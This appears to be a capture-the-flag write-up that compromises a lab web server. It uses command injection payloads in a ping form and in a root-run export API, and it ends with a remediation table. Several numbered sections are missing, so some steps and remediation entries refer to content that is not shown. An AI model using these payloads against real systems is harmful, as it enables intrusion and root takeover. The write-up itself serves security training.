1 Reconnaissance — Nmap & Web Discovery

Every Boot2Root starts with understanding the attack surface. We kicked off an Nmap scan against the target:

Nmap — Full Port Scan with Service Detection
nmap -sCV -p- 10.113.130.146 -T4
PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0) 80/tcp open http Gunicorn Service Info: OS: Linux

Two ports open: 22 (SSH) and 80 (HTTP — Gunicorn). The web server is our entry point. Visiting http://10.113.130.146 shows a Byte Lotus hotel landing page — a surveillance-luxe resort with a disabled "Book a suite" button.

Viewing the page source reveals app.js with a critical clue:

app.js — Hidden Endpoints
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed\u2122");

And robots.txt confirms exactly where not to look — which tells us exactly where to look:

robots.txt
User-agent: *
Disallow: /internal/
Disallow: /status
💡 Lesson: robots.txt is a polite request to search engines, not a security control. It's often the first place to check for hidden directories. If someone took the time to disallow it, it's probably interesting.

2 Command Injection in /internal/netcheck

Visiting /status reveals a staff tool called "Sister-property connectivity" — a form that takes a hostname and pings it. The form POSTs to /internal/netcheck:

We test it with 127.0.0.1 and see the ping output rendered on the page. Then we test for command injection using a semicolon to chain a second command:

Browser — Test Command Injection
127.0.0.1; id
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.037 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms uid=1001(web) gid=1001(web) groups=1001(web)
✅ Command injection confirmed! The server runs ping -c 1 <user_input> with shell=True and no input sanitization. We're executing commands as the web user.

Reading the application source confirms the vulnerability:

app.py — The Vulnerable Code
@app.route("/internal/netcheck", methods=["POST"])
def netcheck():
    host = request.form.get("host", "").strip()
    proc = subprocess.run(
        f"ping -c 1 {host}",    # ← user input directly interpolated
        shell=True,              # ← shell=True enables command chaining
        capture_output=True,
        text=True,
        timeout=15,
    )

4 Establishing Proper SSH Access

Working through the browser form is functional but cumbersome. We noticed /home/web/.ssh/authorized_keys was empty — let's add our own public key for a proper shell.

On the AttackBox, generate a key pair:

cat /tmp/infinity_key.pub

Then use the command injection to append the public key to authorized_keys:

8 Enumerating the Automation Worker (Port 9000)

Port 9000 is a Gunicorn worker running as root. We need to find its API endpoints. A quick fuzz reveals the first clue:

Fuzz Common Endpoints
for word in api run exec cmd job jobs task export health status config; do
  echo -n "$word: "
  curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:9000/$word
  echo
done
api: 404 run: 404 exec: 404 cmd: 404 job: 404 jobs: 404 task: 404 export: 404 health: 200 ← This one works! status: 404 config: 404

/health returns 200. Let's see what it reveals:

GET /health — API Self-Documentation
curl http://127.0.0.1:9000/health
{ "endpoints": { "GET /health": "service status", "POST /jobs/export": { "auth": "Authorization: Bearer ", "body": {"report": ""}, "desc": "archive the latest data export" } }, "runs_as": "root", "service": "automation", "status": "ok" }
🎯 Self-documenting API! The /health endpoint tells us exactly:
  • The endpoint: POST /jobs/export
  • The auth header: Authorization: Bearer <automation key>
  • The required JSON body: {"report": "<report name>"}
  • The worker runs as root
💡 Lesson learned: We spent significant time guessing endpoints because we didn't fuzz port 9000 properly early on. A simple for loop with curl would have found /health immediately, which documents the entire API. Always fuzz internal services — both GET and POST.

9 Command Injection → Root Shell

The /jobs/export endpoint takes a report name and runs:

What the Server Executes
tar czf /var/automation/exports/<report>.tgz /var/automation/data

Our report name is interpolated directly into a shell command — the same pattern as the original ping injection, but this time running as root. We break out with a semicolon and comment out the rest:

Test Root Command Injection
curl -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test;id;#"}'
{ "command": "tar czf /var/automation/exports/test;id;#.tgz ...", "output": "uid=0(root) gid=0(root) groups=0(root)" }

Root! The # comments out the .tgz suffix and the rest of the tar arguments, giving us clean command execution. Now let's find the root flag:

Read the Root Flag
curl -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test;cat /root/root.txt;#"}'

🛡️ Remediation Advice

Issue Fix
Hidden endpoints in client-side code Never rely on obscurity. Use proper authentication on all sensitive endpoints. Comments in JS/HTML are visible to everyone.
Command injection in netcheck Never use shell=True with user input. Use subprocess.run([...]) with argument lists, or validate input against a strict allowlist (e.g., IP addresses only).
Loopback-only services with no auth Loopback binding is not authentication. Any local user can access these services. Add authentication even for internal services.
Credentials in Watchtower API Never expose credentials via unauthenticated APIs. Use a secrets manager or environment variables.
Default FreePBX credentials Force password changes on first login. Disable template/default accounts in production.
Automation key in voicemail Never transmit secrets via voicemail. Use secure key distribution mechanisms with audit trails.
Self-documenting API on /health Production health endpoints should not expose API documentation. Separate docs from runtime.
Command injection in /jobs/export Same fix as above — never interpolate user input into shell commands. Use argument arrays.
Automation worker runs as root Principle of least privilege — the automation worker should run as a dedicated unprivileged user, not root.
